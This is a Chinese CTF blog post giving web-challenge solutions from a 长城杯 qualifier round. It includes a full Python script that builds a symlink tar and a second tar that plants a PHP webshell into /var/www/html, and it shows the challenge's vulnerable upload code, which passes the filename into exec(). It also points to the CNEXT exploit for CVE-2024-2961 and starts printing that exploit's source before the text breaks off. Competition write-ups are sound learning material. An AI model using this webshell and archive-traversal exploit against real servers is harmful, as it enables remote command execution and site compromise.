<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>长城杯网络安全大赛暨京津冀蒙网络安全技能竞赛（初赛） WEB WP | n4c1's Blog</title><meta name="author" content="n4c1"><meta name="copyright" content="n4c1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="文曲签学 EZ_upload分为两步解决,  第一步:上传一个symlink.tar, 将其解压后在tmp目录创建一个&#x2F;tmp&#x2F;my_link指向&#x2F;var&#x2F;www&#x2F;html  第二步:上传webshell.tar, 解压时将其中的webshell.php解压到&#x2F;tmp&#x2F;my_link中 123456789101112131415">
<meta property="og:type" content="article">
<meta property="og:title" content="长城杯网络安全大赛暨京津冀蒙网络安全技能竞赛（初赛） WEB WP">
<meta property="og:url" content="http://example.com/2025/09/15/%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E8%92%99%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89-WEB-WP/index.html">
<meta property="og:site_name" content="n4c1&#39;s Blog">
<meta property="og:description" content="文曲签学 EZ_upload分为两步解决,  第一步:上传一个symlink.tar, 将其解压后在tmp目录创建一个&#x2F;tmp&#x2F;my_link指向&#x2F;var&#x2F;www&#x2F;html  第二步:上传webshell.tar, 解压时将其中的webshell.php解压到&#x2F;tmp&#x2F;my_link中 123456789101112131415">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/head.jpg">
<meta property="article:published_time" content="2025-09-15T09:07:40.000Z">
<meta property="article:modified_time" content="2025-09-15T09:09:21.136Z">
<meta property="article:author" content="n4c1">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/head.jpg"><link rel="shortcut icon" href="/img/head.jpg"><link rel="canonical" href="http://example.com/2025/09/15/%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E8%92%99%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89-WEB-WP/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '长城杯网络安全大赛暨京津冀蒙网络安全技能竞赛（初赛） WEB WP',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-09-15 17:09:21'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="n4c1's Blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">68</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">52</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/home_page.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="n4c1's Blog"><span class="site-name">n4c1's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">长城杯网络安全大赛暨京津冀蒙网络安全技能竞赛（初赛） WEB WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-09-15T09:07:40.000Z" title="发表于 2025-09-15 17:07:40">2025-09-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-09-15T09:09:21.136Z" title="更新于 2025-09-15 17:09:21">2025-09-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="长城杯网络安全大赛暨京津冀蒙网络安全技能竞赛（初赛） WEB WP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="文曲签学"><a href="#文曲签学" class="headerlink" title="文曲签学"></a>文曲签学</h2><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250914125219.png" alt="image.png"></p>
<h2 id="EZ-upload"><a href="#EZ-upload" class="headerlink" title="EZ_upload"></a>EZ_upload</h2><p>分为两步解决,</p>
<ol>
<li><p>第一步:上传一个symlink.tar, 将其解压后在tmp目录创建一个&#x2F;tmp&#x2F;my_link指向&#x2F;var&#x2F;www&#x2F;html</p>
</li>
<li><p>第二步:上传webshell.tar, 解压时将其中的webshell.php解压到&#x2F;tmp&#x2F;my_link中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line"><span class="comment"># make_two_stage_tar.py  </span></span><br><span class="line"><span class="comment"># 生成两个 tar:#  1) symlink.tar  -&gt; 包含 symlink &quot;my_link&quot; -&gt; &quot;/var/www/html&quot;#  2) webshell.tar -&gt; 包含文件 &quot;my_link/webshell.php&quot;#  </span></span><br><span class="line"><span class="comment"># 说明: 在目标上先解 symlink.tar（在 /tmp 下），再解 webshell.tar。  </span></span><br><span class="line"><span class="comment">#       如果 /tmp/my_link 是符号链接并指向 /var/www/html，则解 webshell.tar 时会尝试写入 /var/www/html/webshell.php  </span></span><br><span class="line"><span class="keyword">import</span> tarfile, io, time, os  </span><br><span class="line">php_shell = <span class="string">b&quot;&lt;?php if(isset($_REQUEST[&#x27;cmd&#x27;]))&#123; system($_REQUEST[&#x27;cmd&#x27;]); &#125; else &#123; echo &#x27;ok&#x27;; &#125; ?&gt;\n&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_symlink_tar</span>(<span class="params">path=<span class="string">&quot;symlink.tar&quot;</span>, link_name=<span class="string">&quot;my_link&quot;</span>, link_target=<span class="string">&quot;/var/www/html&quot;</span></span>):  </span><br><span class="line">    <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(path, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> tar:  </span><br><span class="line">        ti = tarfile.TarInfo(name=link_name)  </span><br><span class="line">        ti.<span class="built_in">type</span> = tarfile.SYMTYPE  <span class="comment"># symlink  </span></span><br><span class="line">        ti.linkname = link_target  </span><br><span class="line">        ti.mtime = <span class="built_in">int</span>(time.time())  </span><br><span class="line">        tar.addfile(ti)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Created&quot;</span>, path, <span class="string">&quot;-&gt; symlink&quot;</span>, link_name, <span class="string">&quot;-&gt;&quot;</span>, link_target)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_webshell_tar</span>(<span class="params">path=<span class="string">&quot;webshell.tar&quot;</span>, file_entry=<span class="string">&quot;my_link/webshell.php&quot;</span>, content=php_shell</span>):  </span><br><span class="line">    <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(path, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> tar:  </span><br><span class="line">        tinfo = tarfile.TarInfo(name=file_entry)  </span><br><span class="line">        tinfo.size = <span class="built_in">len</span>(content)  </span><br><span class="line">        tinfo.mtime = <span class="built_in">int</span>(time.time())  </span><br><span class="line">        tar.addfile(tinfo, io.BytesIO(content))  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Created&quot;</span>, path, <span class="string">&quot;-&gt; contains&quot;</span>, file_entry)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    make_symlink_tar(<span class="string">&quot;symlink.tar&quot;</span>, <span class="string">&quot;my_link&quot;</span>, <span class="string">&quot;/var/www/html&quot;</span>)  </span><br><span class="line">    make_webshell_tar(<span class="string">&quot;webshell.tar&quot;</span>, <span class="string">&quot;my_link/webshell.php&quot;</span>, php_shell)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nFiles created in:&quot;</span>, os.path.abspath(<span class="string">&quot;.&quot;</span>))  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Files:&quot;</span>, os.path.exists(<span class="string">&quot;symlink.tar&quot;</span>), os.path.exists(<span class="string">&quot;webshell.tar&quot;</span>))</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="SeRce"><a href="#SeRce" class="headerlink" title="SeRce"></a>SeRce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleFileUpload</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$uploadDirectory</span> = <span class="string">&#x27;/tmp/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>] !== UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;文件上传失败。&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^a-zA-Z0-9_\-\.]/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;文件名不符合要求。&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$destination</span> = <span class="variable">$uploadDirectory</span> . <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$destination</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; tar -xvf &#x27;</span> . <span class="variable">$filename</span>.<span class="string">&#x27;&amp;&amp;pwd&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$destination</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;文件移动失败。&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">handleFileUpload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>去年的老trick了, fileRead to RCE</p>
<p><a target="_blank" rel="noopener" href="https://github.com/ambionics/cnext-exploits">https://github.com/ambionics/cnext-exploits</a></p>
<p>改一下脚本直接用</p>
<p>cnext-exploit.py:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># CNEXT: PHP file-read to RCE (CVE-2024-2961)  </span></span><br><span class="line"><span class="comment"># Date: 2024-05-27  </span></span><br><span 